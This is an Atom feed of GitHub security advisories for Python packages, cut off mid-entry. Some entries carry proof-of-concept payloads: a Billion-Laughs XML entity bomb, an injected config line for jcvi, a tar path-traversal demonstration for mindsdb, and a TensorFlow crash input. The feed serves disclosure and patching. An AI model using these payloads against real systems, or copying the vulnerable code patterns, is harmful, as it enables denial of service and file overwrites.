<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
    <id>https://azu.github.io/github-advisory-database-rss/pip.rss</id>
    <title>Security Advisory for Python packages hosted at PyPI.org</title>
    <updated>2023-09-01T20:01:30.207Z</updated>
    <generator>github-advisory-database-rss</generator>
    <link rel="alternate" href="https://github.com/advisories?query=type%3Areviewed+ecosystem%3Apip"/>
    <subtitle>Security Advisory for Python packages hosted at PyPI.org on GitHub</subtitle>
    <rights>github-advisory-database-rss</rights>
    <category term="CRITICAL"/>
    <category term="HIGH"/>
    <category term="MODERATE"/>
    <category term="LOW"/>
    <entry>
        <title type="html"><![CDATA[[python-libnmap] XML Injection in python-libnmap]]></title>
        <id>https://github.com/advisories/GHSA-9ccv-p7fg-m73x</id>
        <link href="https://github.com/advisories/GHSA-9ccv-p7fg-m73x"/>
        <updated>2023-09-01T19:56:22.000Z</updated>
        <content type="html"><![CDATA[<h3 id="description">Description</h3>
<p>python-libnmap is affected by a Billion-Laughs -style XML injection vulnerability.</p>
<h3 id="poc">PoC</h3>
<pre><code class="language-python">ty = NmapParser()

payload = """
&lt;!DOCTYPE lolz [
 &lt;!ENTITY lol "lol"&gt;
 &lt;!ELEMENT lolz (#PCDATA)&gt;
 &lt;!ENTITY lol1 "&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;"&gt;
 &lt;!ENTITY lol2 "&amp;lol1;&amp;lol1;&amp;lol1;&amp;lol1;&amp;lol1;&amp;lol1;&amp;lol1;&amp;lol1;&amp;lol1;&amp;lol1;"&gt;
 &lt;!ENTITY lol3 "&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;"&gt;
]&gt;
&lt;lolz&gt;&lt;hello&gt;&amp;lol3;&lt;/hello&gt;&lt;/lolz&gt;
"""

ty.parse(payload)
</code></pre>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2019-1010017">https://nvd.nist.gov/vuln/detail/CVE-2019-1010017</a></li>
<li><a href="https://github.com/savon-noir/python-libnmap/issues/87">https://github.com/savon-noir/python-libnmap/issues/87</a></li>
<li><a href="https://github.com/savon-noir/python-libnmap/commit/71b707758851e4b622f87d9a73266e06f60aeab4">https://github.com/savon-noir/python-libnmap/commit/71b707758851e4b622f87d9a73266e06f60aeab4</a></li>
<li><a href="https://github.com/advisories/GHSA-9ccv-p7fg-m73x">https://github.com/advisories/GHSA-9ccv-p7fg-m73x</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-9ccv-p7fg-m73x</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2019-07-18T15:38:41.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[recommender-xblock] Cross-site scripting in recommender-xblock]]></title>
        <id>https://github.com/advisories/GHSA-3j5x-7ccf-ppgm</id>
        <link href="https://github.com/advisories/GHSA-3j5x-7ccf-ppgm"/>
        <updated>2023-09-01T19:51:45.000Z</updated>
        <content type="html"><![CDATA[<p>Recommender before 1.3.1 allows XSS. It is possible for a learner to craft a fake resource to recommender, that includes script which could possibly steal credentials from staff if they are lured into viewing the recommended resource.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2018-20858">https://nvd.nist.gov/vuln/detail/CVE-2018-20858</a></li>
<li><a href="https://github.com/edx/RecommenderXBlock/pull/2">https://github.com/edx/RecommenderXBlock/pull/2</a></li>
<li><a href="https://groups.google.com/forum/#!topic/openedx-announce/SF8Sn6MuUTg">https://groups.google.com/forum/#!topic/openedx-announce/SF8Sn6MuUTg</a></li>
<li><a href="https://github.com/advisories/GHSA-3j5x-7ccf-ppgm">https://github.com/advisories/GHSA-3j5x-7ccf-ppgm</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-3j5x-7ccf-ppgm</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2019-08-21T16:15:33.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[jcvi] jcvi vulnerable to Configuration Injection due to unsanitized user input ]]></title>
        <id>https://github.com/advisories/GHSA-x49m-3cw7-gq5q</id>
        <link href="https://github.com/advisories/GHSA-x49m-3cw7-gq5q"/>
        <updated>2023-09-01T17:41:41.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p>A configuration injection happens when user input is considered by the application in an unsanitized format and can reach the configuration file. A malicious user may craft a special payload that may lead to a command injection.</p>
<h3 id="poc">PoC</h3>
<p>The vulnerable code snippet is <a href="https://github.com/tanghaibao/jcvi/blob/cede6c65c8e7603cb266bc3395ac8f915ea9eac7/jcvi/apps/base.py#LL2227C1-L2228C41">/jcvi/apps/base.py#LL2227C1-L2228C41</a>. Under some circumstances a user input is retrieved and stored within the <code>fullpath</code> variable which reaches the configuration file <code>~/.jcvirc</code>.</p>
<pre><code class="language-python">        fullpath = input(msg).strip()
        config.set(PATH, name, fullpath)
</code></pre>
<p>I ripped a part of the codebase into a runnable PoC as follows. All the PoC does is call the <code>getpath()</code> function under some circumstances.</p>
<pre><code class="language-python">from configparser import (
    ConfigParser,
    RawConfigParser,
    NoOptionError,
    NoSectionError,
    ParsingError,
)

import errno
import os
import sys
import os.path as op
import shutil
import signal
import sys
import logging


def is_exe(fpath):
    return op.isfile(fpath) and os.access(fpath, os.X_OK)


def which(program):
    """
    Emulates the unix which command.

    &gt;&gt;&gt; which("cat")
    "/bin/cat"
    &gt;&gt;&gt; which("nosuchprogram")
    """
    fpath, fname = op.split(program)
    if fpath:
        if is_exe(program):
            return program
    else:
        for path in os.environ["PATH"].split(os.pathsep):
            exe_file = op.join(path, program)
            if is_exe(exe_file):
                return exe_file

    return None


def getpath(cmd, name=None, url=None, cfg="~/.jcvirc", warn="exit"):
    """
    Get install locations of common binaries
    First, check ~/.jcvirc file to get the full path
    If not present, ask on the console and store
    """
    p = which(cmd)  # if in PATH, just returns it
    if p:
        return p

    PATH = "Path"
    config = RawConfigParser()
    cfg = op.expanduser(cfg)
    changed = False
    if op.exists(cfg):
        config.read(cfg)

    assert name is not None, "Need a program name"

    try:
        fullpath = config.get(PATH, name)
    except NoSectionError:
        config.add_section(PATH)
        changed = True

    try:
        fullpath = config.get(PATH, name)
    except NoOptionError:
        msg = "=== Configure path for {0} ===\n".format(name, cfg)
        if url:
            msg += "URL: {0}\n".format(url)
        msg += "[Directory that contains `{0}`]: ".format(cmd)
        fullpath = input(msg).strip()
        config.set(PATH, name, fullpath)
        changed = True

    path = op.join(op.expanduser(fullpath), cmd)
    if warn == "exit":
        try:
            assert is_exe(path), "***ERROR: Cannot execute binary `{0}`. ".format(path)
        except AssertionError as e:
            sys.exit("{0!s}Please verify and rerun.".format(e))

    if changed:
        configfile = open(cfg, "w")
        config.write(configfile)
        logging.debug("Configuration written to `{0}`.".format(cfg))

    return path


# Call to getpath
path = getpath("not-part-of-path", name="CLUSTALW2", warn="warn")
print(path)
</code></pre>
<p>To run the PoC, you need to remove the config file <code>~/.jcvirc</code> to emulate the first run, </p>
<pre><code class="language-bash"># Run the PoC with the payload
echo -e "e\rvvvvvvvv = zzzzzzzz\n" | python3 poc.py
</code></pre>
<p><img alt="image" src="https://user-images.githubusercontent.com/13036531/247852364-f8a384a3-fc62-41ca-b467-877d197ac6ff.png"></p>
<p>You can notice the random key/value characters <code>vvvvvvvv = zzzzzzzz</code> were successfully injected.</p>
<h3 id="impact">Impact</h3>
<p>The impact of a configuration injection may vary. Under some conditions, it may lead to command injection if there is for instance shell code execution from the configuration file values.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/tanghaibao/jcvi/security/advisories/GHSA-x49m-3cw7-gq5q">https://github.com/tanghaibao/jcvi/security/advisories/GHSA-x49m-3cw7-gq5q</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2023-35932">https://nvd.nist.gov/vuln/detail/CVE-2023-35932</a></li>
<li><a href="https://github.com/tanghaibao/jcvi/blob/cede6c65c8e7603cb266bc3395ac8f915ea9eac7/jcvi/apps/base.py#LL2227C1-L2228C41">https://github.com/tanghaibao/jcvi/blob/cede6c65c8e7603cb266bc3395ac8f915ea9eac7/jcvi/apps/base.py#LL2227C1-L2228C41</a></li>
<li><a href="https://github.com/advisories/GHSA-x49m-3cw7-gq5q">https://github.com/advisories/GHSA-x49m-3cw7-gq5q</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-x49m-3cw7-gq5q</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2023-06-23T21:44:35.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[mindsdb] Arbitrary file write in mindsdb when Extracting Tarballs retrieved from a remote location ]]></title>
        <id>https://github.com/advisories/GHSA-7x45-phmr-9wqp</id>
        <link href="https://github.com/advisories/GHSA-7x45-phmr-9wqp"/>
        <updated>2023-09-01T17:39:39.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p>An unsafe extraction is being performed using <code>shutil.unpack_archive()</code> from a remotely retrieved tarball. Which may lead to the writing of the extracted files to an unintended location. This vulnerability is sometimes called a <strong>TarSlip</strong> or a <strong>ZipSlip variant</strong>.</p>
<h3 id="details">Details</h3>
<p>Unpacking files using the high-level function <code>shutil.unpack_archive()</code> from a potentially malicious tarball without validating that the destination file path remained within the intended destination directory may cause files to be overwritten outside the destination directory.</p>
<p>As can be seen in the vulnerable snippet code source, an archive is being retrieved using the <code>download_file()</code> function from a remote location which is a user-provided permanent storage bucket <code>s3</code>. Immediately after being retrieved, the tarball is unsafely unpacked using the function <code>shutil.unpack_archive()</code>.</p>
<p>The vulnerable code is <a href="https://github.com/mindsdb/mindsdb/blob/69c76e727b8067f32b06ab83bb835a8c416c4f21/mindsdb/interfaces/storage/fs.py#L128..L129">L128..L129</a> in <a href="https://github.com/mindsdb/mindsdb/blob/69c76e727b8067f32b06ab83bb835a8c416c4f21/mindsdb/interfaces/storage/fs.py">fs.py</a> file.</p>
<pre><code class="language-python3">    def __init__(self):
        super().__init__()
        if 's3_credentials' in self.config['permanent_storage']:
            self.s3 = boto3.client('s3', **self.config['permanent_storage']['s3_credentials'])
        else:
            self.s3 = boto3.client('s3')
       
        # User provided remote storage!
        self.bucket = self.config['permanent_storage']['bucket'] 

    def get(self, local_name, base_dir):
        remote_name = local_name
        remote_ziped_name = f'{remote_name}.tar.gz'
        local_ziped_name = f'{local_name}.tar.gz'
        local_ziped_path = os.path.join(base_dir, local_ziped_name)
        os.makedirs(base_dir, exist_ok=True)
        
        # Retrieve a potentially malicious tarball
        self.s3.download_file(self.bucket, remote_ziped_name, local_ziped_path)

        # Perform an unsafe extraction
        shutil.unpack_archive(local_ziped_path, base_dir)

        os.system(f'chmod -R 777 {base_dir}')
        os.remove(local_ziped_path)
</code></pre>
<h3 id="poc">PoC</h3>
<p>The following PoC is provided for illustration purposes only. It showcases the risk of extracting a non-harmless text file <code>sim4n6.txt</code> to one of the parent locations rather than the intended current folder.</p>
<pre><code class="language-bash">&gt; tar --list -f archive.tar
tar: Removing leading "../../../" from member names
../../../sim4n6.txt

&gt; python3 
Python 3.10.6 (main, Nov  2 2022, 18:53:38) [GCC 11.3.0] on linux
Type "help", "copyright", "credits" or "license" for more information.
&gt;&gt;&gt; import shutil
&gt;&gt;&gt; shutil.unpack_archive("archive.tar")
&gt;&gt;&gt; exit()

&gt; test -f ../../../sim4n6.txt &amp;&amp; echo "sim4n6.txt exists"
sim4n6.txt exists
</code></pre>
<h3 id="attack-scenario">Attack Scenario</h3>
<p>An attacker could craft a malicious tarball with a filename path, such as <code>../../../../../../../../etc/passwd</code>, and then serve the archive remotely using a personal bucket <code>s3</code>, thus, retrieve the tarball through <strong>mindsdb</strong> and overwrite the system files of the hosting server. </p>
<h3 id="mitigation">Mitigation</h3>
<p>Potential mitigation could be to:</p>
<ul>
<li>Use a safer module, like <code>zipfile</code>.</li>
<li>Validate the location of the extracted files and discard those with malicious paths such as relative path <code>..</code> or absolute path such as <code>/etc/password</code>.</li>
<li>Perform a checksum verification for the retrieved archive, but hard-coding the hashes may be cumbersome and difficult to manage.</li>
</ul>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/mindsdb/mindsdb/security/advisories/GHSA-7x45-phmr-9wqp">https://github.com/mindsdb/mindsdb/security/advisories/GHSA-7x45-phmr-9wqp</a></li>
<li><a href="https://github.com/mindsdb/mindsdb/blob/69c76e727b8067f32b06ab83bb835a8c416c4f21/mindsdb/interfaces/storage/fs.py">https://github.com/mindsdb/mindsdb/blob/69c76e727b8067f32b06ab83bb835a8c416c4f21/mindsdb/interfaces/storage/fs.py</a></li>
<li><a href="https://github.com/mindsdb/mindsdb/blob/69c76e727b8067f32b06ab83bb835a8c416c4f21/mindsdb/interfaces/storage/fs.py#L128..L129">https://github.com/mindsdb/mindsdb/blob/69c76e727b8067f32b06ab83bb835a8c416c4f21/mindsdb/interfaces/storage/fs.py#L128..L129</a></li>
<li><a href="https://github.com/mindsdb/mindsdb/releases/tag/v22.11.4.3">https://github.com/mindsdb/mindsdb/releases/tag/v22.11.4.3</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2022-23522">https://nvd.nist.gov/vuln/detail/CVE-2022-23522</a></li>
<li><a href="https://github.com/advisories/GHSA-7x45-phmr-9wqp">https://github.com/advisories/GHSA-7x45-phmr-9wqp</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-7x45-phmr-9wqp</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2023-03-30T20:16:33.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[tensorflow-cpu] TensorFlow Denial of Service vulnerability]]></title>
        <id>https://github.com/advisories/GHSA-fxgc-95xx-grvq</id>
        <link href="https://github.com/advisories/GHSA-fxgc-95xx-grvq"/>
        <updated>2023-09-01T15:23:50.000Z</updated>
        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
<p>A malicious invalid input crashes a tensorflow model (Check Failed) and can be used to trigger a denial of service attack.
To minimize the bug, we built a simple single-layer TensorFlow model containing a Convolution3DTranspose layer, which works well with expected inputs and can be deployed in real-world systems. However, if we call the model with a malicious input which has a zero dimension, it gives Check Failed failure and crashes. </p>
<pre><code class="language-python">import tensorflow as tf

class MyModel(tf.keras.Model):
    def __init__(self):
        super().__init__()
        self.conv = tf.keras.layers.Convolution3DTranspose(2, [3,3,3], padding="same")
        
    def call(self, input):
        return self.conv(input)
model = MyModel() # Defines a valid model.

x = tf.random.uniform([1, 32, 32, 32, 3], minval=0, maxval=0, dtype=tf.float32) # This is a valid input.
output = model.predict(x)
print(output.shape) # (1, 32, 32, 32, 2)

x = tf.random.uniform([1, 32, 32, 0, 3], dtype=tf.float32) # This is an invalid input.
output = model(x) # crash
</code></pre>
<p>This Convolution3DTranspose layer is a very common API in modern neural networks. The ML models containing such vulnerable components could be deployed in ML applications or as cloud services. This failure could be potentially used to trigger a denial of service attack on ML cloud services.</p>
<h3 id="patches">Patches</h3>
<p>We have patched the issue in</p>
<ul>
<li>GitHub commit <a href="https://github.com/tensorflow/tensorflow/commit/948fe6369a5711d4b4568ea9bbf6015c6dfb77e2">948fe6369a5711d4b4568ea9bbf6015c6dfb77e2</a></li>
<li>GitHub commit <a href="https://github.com/keras-team/keras/commit/85db5d07db54b853484bfd358c3894d948c36baf">85db5d07db54b853484bfd358c3894d948c36baf</a>.</li>
</ul>
<p>The fix will be included in TensorFlow 2.12.0. We will also cherrypick this commit on TensorFlow 2.11.1</p>
<h3 id="for-more-information">For more information</h3>
<p>Please consult <a href="https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md">our security guide</a> for more information regarding the security model and how to contact us with issues and questions.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/tensorflow/tensorflow/security/advisories/GHSA-fxgc-95xx-grvq">https://github.com/tensorflow/tensorflow/security/advisories/GHSA-fxgc-95xx-grvq</a></li>
<li><a href="https://github.com/keras-team/keras/commit/85db5d07db54b853484bfd358c3894d948c36baf">https://github.com/keras-team/keras/commit/85db5d07db54b853484bfd358c3894d948c36baf</a></li>
<li><a href="https://github.com/tensorflow/tensorflow/commit/948fe6369a5711d4b4568ea9bbf6015c6dfb77e2">https://github.com/tensorflow/tensorflow/commit/948fe6369a5711d4b4568ea9bbf6015c6dfb77e2</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2023-25661">https://nvd.nist.gov/vuln/detail/CVE-2023-25661</a></li>
<li><a href="https://github.com/advisories/GHSA-fxgc-95xx-grvq">https://github.com/advisories/GHSA-fxgc-95xx-grvq</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-fxgc-95xx-grvq</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2023-03-27T21:05:10.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[tensorflow] TensorFlow Denial of Service vulnerability]]></title>
        <id>https://github.com/advisories/GHSA-fxgc-95xx-grvq</id>
        <link href="https://github.com/advisories/GHSA-fxgc-95xx-grvq"/>
        <updated>2023-09-01T15:23:50.000Z</updated>
        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
<p>A malicious invalid input crashes a tensorflow model (Check Failed) and can be used to trigger a denial of service attack.
To minimize the bug, we built a simple single-layer TensorFlow model containing a Convolution3DTranspose layer, which works well with expected inputs and can be deployed in real-world systems. However, if we call the model with a malicious input which has a zero dimension, it gives Check Failed failure and crashes. </p>
<pre><code class="language-python">import tensorflow as tf

class MyModel(tf.keras.Model):
    def __init__(self):
        super().__init__()
        self.conv = tf.keras.layers.Convolution3DTranspose(2, [3,3,3], padding="same")
        
    def call(self, input):
        return self.conv(input)
model = MyModel() # Defines a valid model.

x = tf.random.uniform([1, 32, 32, 32, 3], minval=0, maxval=0, dtype=tf.float32) # This is a valid input.
output = model.predict(x)
print(output.shape) # (1, 32, 32, 32, 2)

x = tf.random.uniform([1, 32, 32, 0, 3], dtype=tf.float32) # This is an invalid input.
output = model(x) # crash
</code></pre>
<p>This Convolution3DTranspose layer is a very common API in modern neural networks. The ML models containing such vulnerable components could be deployed in ML applications or as cloud services. This failure could be potentially used to trigger a denial of service attack on ML cloud services.</p>
<h3 id="patches">Patches</h3>
<p>We have patched the issue in</p>
<ul>
<li>GitHub commit <a href="https://github.com/tensorflow/tensorflow/commit/948fe6369a5711d4b4568ea9bbf6015c6dfb77e2">948fe6369a5711d4b4568ea9bbf6015c6dfb77e2</a></li>
<li>GitHub commit <a href="https://github.com/keras-team/keras/commit/85db5d07db54b853484bfd358c3894d948c36baf">85db5d07db54b853484bfd358c3894d948c36baf</a>.</li>
</ul>
<p>The fix will be included in TensorFlow 2.12.0. We will also cherrypick this commit on TensorFlow 2.11.1</p>
<h3 id="for-more-information">For more information</h3>
<p>Please consult <a href="https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md">our security guide</a> for more information regarding the security model and how to contact us with issues and questions.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/tensorflow/tensorflow/security/advisories/GHSA-fxgc-95xx-grvq">https://github.com/tensorflow/tensorflow/security/advisories/GHSA-fxgc-95xx-grvq</a></li>
<li><a href="https://github.com/keras-team/keras/commit/85db5d07db54b853484bfd358c3894d948c36baf">https://github.com/keras-team/keras/commit/85db5d07db54b853484bfd358c3894d948c36baf</a></li>
<li><a href="https://github.com/tensorflow/tensorflow/commit/948fe6369a5711d4b4568ea9bbf6015c6dfb77e2">https://github.com/tensorflow/tensorflow/commit/948fe6369a5711d4b4568ea9bbf6015c6dfb77e2</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2023-25661">https://nvd.nist.gov/vuln/detail/CVE-2023-25661</a></li>
<li><a href="https://github.com/advisories/GHSA-fxgc-95xx-grvq">https://github.com/advisories/GHSA-fxgc-95xx-grvq</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-fxgc-95xx-grvq</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2023-03-27T21:05:10.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[restkit] Restkit Does Not Validate TLS certificates]]></title>
        <id>https://github.com/advisories/GHSA-p9cv-hrxr-fxx8</id>
        <link href="https://github.com/advisories/GHSA-p9cv-hrxr-fxx8"/>
        <updated>2023-09-01T10:29:39.000Z</updated>
        <content type="html"><![CDATA[<p>Restkit allows man-in-the-middle attackers to spoof TLS servers by leveraging use of the <code>ssl.wrap_socket</code> function in Python with the default CERT_NONE value for the cert_reqs argument.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2015-2674">https://nvd.nist.gov/vuln/detail/CVE-2015-2674</a></li>
<li><a href="https://github.com/benoitc/restkit/issues/140">https://github.com/benoitc/restkit/issues/140</a></li>
<li><a href="https://bugzilla.redhat.com/show_bug.cgi?id=1202837">https://bugzilla.redhat.com/show_bug.cgi?id=1202837</a></li>
<li><a href="http://www.openwall.com/lists/oss-security/2015/03/23/7">http://www.openwall.com/lists/oss-security/2015/03/23/7</a></li>
<li><a href="https://github.com/advisories/GHSA-p9cv-hrxr-fxx8">https://github.com/advisories/GHSA-p9cv-hrxr-fxx8</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-p9cv-hrxr-fxx8</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2022-05-17T01:59:05.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[donfig] Donfig Command Injection in collect_yaml method]]></title>
        <id>https://github.com/advisories/GHSA-3qr5-h7w4-3gx3</id>
        <link href="https://github.com/advisories/GHSA-3qr5-h7w4-3gx3"/>
        <updated>2023-09-01T10:24:47.000Z</updated>
        <content type="html"><![CDATA[<p>An issue was discovered in Donfig 0.3.0. There is a vulnerability in the <code>collect_yaml</code> method in <code>config_obj.py</code>. It can execute arbitrary Python commands, resulting in command execution.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2019-7537">https://nvd.nist.gov/vuln/detail/CVE-2019-7537</a></li>
<li><a href="https://github.com/pytroll/donfig/issues/5">https://github.com/pytroll/donfig/issues/5</a></li>
<li><a href="https://github.com/advisories/GHSA-3qr5-h7w4-3gx3">https://github.com/advisories/GHSA-3qr5-h7w4-3gx3</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-3qr5-h7w4-3gx3</uri>
        </author>
        <category label="severity" term="CRITICAL"/>
        <published>2022-05-14T01:15:39.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[markdown2] XSS in python-markdown2]]></title>
        <id>https://github.com/advisories/GHSA-fv3h-8x5j-pvgq</id>
        <link href="https://github.com/advisories/GHSA-fv3h-8x5j-pvgq"/>
        <updated>2023-09-01T10:18:11.000Z</updated>
        <content type="html"><![CDATA[<p>python-markdown2 through 2.3.8 allows XSS because element names are mishandled unless a \w+ match succeeds. For example, an attack might use elementname@ or elementname- with an onclick attribute.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2020-11888">https://nvd.nist.gov/vuln/detail/CVE-2020-11888</a></li>
<li><a href="https://github.com/trentm/python-markdown2/issues/348">https://github.com/trentm/python-markdown2/issues/348</a></li>
<li><a href="http://lists.opensuse.org/opensuse-security-announce/2020-05/msg00031.html">http://lists.opensuse.org/opensuse-security-announce/2020-05/msg00031.html</a></li>
<li><a href="http://lists.opensuse.org/opensuse-security-announce/2020-05/msg00035.html">http://lists.opensuse.org/opensuse-security-announce/2020-05/msg00035.html</a></li>
<li><a href="https://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/6XOAIRJJCZNJUALXDHSIGH5PS2H63A3J/">https://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/6XOAIRJJCZNJUALXDHSIGH5PS2H63A3J/</a></li>
<li><a href="https://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/AQLRBGRVRRZK7P5SFL2MNGXFX37YHJAV/">https://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/AQLRBGRVRRZK7P5SFL2MNGXFX37YHJAV/</a></li>
<li><a href="https://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/PN6QSHRFZXRQAYZJQ4MOW5MKIXBYOMED/">https://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/PN6QSHRFZXRQAYZJQ4MOW5MKIXBYOMED/</a></li>
<li><a href="https://github.com/advisories/GHSA-fv3h-8x5j-pvgq">https://github.com/advisories/GHSA-fv3h-8x5j-pvgq</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-fv3h-8x5j-pvgq</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2020-04-22T20:59:50.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[django-nopassword] django-nopassword stores secrets in cleartext ]]></title>
        <id>https://github.com/advisories/GHSA-37cf-r3w2-gjfw</id>
        <link href="https://github.com/advisories/GHSA-37cf-r3w2-gjfw"/>
        <updated>2023-09-01T10:17:34.000Z</updated>
        <content type="html"><![CDATA[<p>django-nopassword before 5.0.0 stores cleartext secrets in the database.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2019-10682">https://nvd.nist.gov/vuln/detail/CVE-2019-10682</a></li>
<li><a href="https://github.com/relekang/django-nopassword/commit/d8b4615f5fbfe3997d96cf4cb3e342406396193c">https://github.com/relekang/django-nopassword/commit/d8b4615f5fbfe3997d96cf4cb3e342406396193c</a></li>
<li><a href="https://github.com/relekang/django-nopassword/blob/8e8cfc765ee00adfed120c2c79bf71ef856e9022/nopassword/models.py#L14">https://github.com/relekang/django-nopassword/blob/8e8cfc765ee00adfed120c2c79bf71ef856e9022/nopassword/models.py#L14</a></li>
<li><a href="https://github.com/relekang/django-nopassword/compare/v4.0.1...v5.0.0">https://github.com/relekang/django-nopassword/compare/v4.0.1...v5.0.0</a></li>
<li><a href="https://github.com/advisories/GHSA-37cf-r3w2-gjfw">https://github.com/advisories/GHSA-37cf-r3w2-gjfw</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-37cf-r3w2-gjfw</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2020-06-05T16:09:19.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[Twisted] Improper Input Validation in Twisted]]></title>
        <id>https://github.com/advisories/GHSA-h96w-mmrf-2h6v</id>
        <link href="https://github.com/advisories/GHSA-h96w-mmrf-2h6v"/>
        <updated>2023-09-01T10:17:09.000Z</updated>
        <content type="html"><![CDATA[<p>In Twisted Web before 20.3.0, there was an HTTP request splitting vulnerability. When presented with two content-length headers, it ignored the first header. When the second content-length value was set to zero, the request body was interpreted as a pipelined request.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2020-10108">https://nvd.nist.gov/vuln/detail/CVE-2020-10108</a></li>
<li><a href="https://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/6ISMZFZBWW4EV6ETJGXAYIXN3AT7GBPL/">https://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/6ISMZFZBWW4EV6ETJGXAYIXN3AT7GBPL/</a></li>
<li><a href="https://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/YW3NIL7VXSGJND2Q4BSXM3CFTAFU6T7D/">https://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/YW3NIL7VXSGJND2Q4BSXM3CFTAFU6T7D/</a></li>
<li><a href="https://usn.ubuntu.com/4308-1/">https://usn.ubuntu.com/4308-1/</a></li>
<li><a href="https://security.gentoo.org/glsa/202007-24">https://security.gentoo.org/glsa/202007-24</a></li>
<li><a href="https://usn.ubuntu.com/4308-2/">https://usn.ubuntu.com/4308-2/</a></li>
<li><a href="https://www.oracle.com/security-alerts/cpuoct2020.html">https://www.oracle.com/security-alerts/cpuoct2020.html</a></li>
<li><a href="https://lists.debian.org/debian-lts-announce/2022/02/msg00021.html">https://lists.debian.org/debian-lts-announce/2022/02/msg00021.html</a></li>
<li><a href="https://github.com/twisted/twisted/blob/6ff2c40e42416c83203422ff70dfc49d2681c8e2/NEWS.rst#twisted-2030-2020-03-13">https://github.com/twisted/twisted/blob/6ff2c40e42416c83203422ff70dfc49d2681c8e2/NEWS.rst#twisted-2030-2020-03-13</a></li>
<li><a href="https://know.bishopfox.com/advisories/twisted-version-19.10.0">https://know.bishopfox.com/advisories/twisted-version-19.10.0</a></li>
